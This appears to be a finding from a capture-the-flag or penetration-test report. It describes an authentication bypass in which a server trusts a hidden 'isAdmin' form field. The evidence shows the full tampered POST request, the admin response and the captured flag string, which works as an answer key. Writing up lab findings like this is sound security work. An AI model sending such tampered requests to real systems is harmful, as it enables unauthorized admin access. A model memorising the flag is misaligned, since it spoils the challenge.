findings.title: Authentication Bypass via Hidden Parameter Tampering (isAdmin)
findings.description: The login form contains a hidden HTML field `<input type="hidden" name="isAdmin" value="false" />`. The server-side PHP code trusts this client-supplied parameter to determine admin access. By changing the field value from `false` to `true` in a POST request (any username/password), an attacker completely bypasses authentication and gains admin access, including the CTF flag.
findings.evidence:
POST /index.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded username=admin&password=admin&isAdmin=true Response body contained:

Welcome Admin

Congratulations, here is the flag: flag{1d0287b6-9de1-4c01-9d39-40aeed9d310d}

FLAG: flag{1d0287b6-9de1-4c01-9d39-40aeed9d310d}
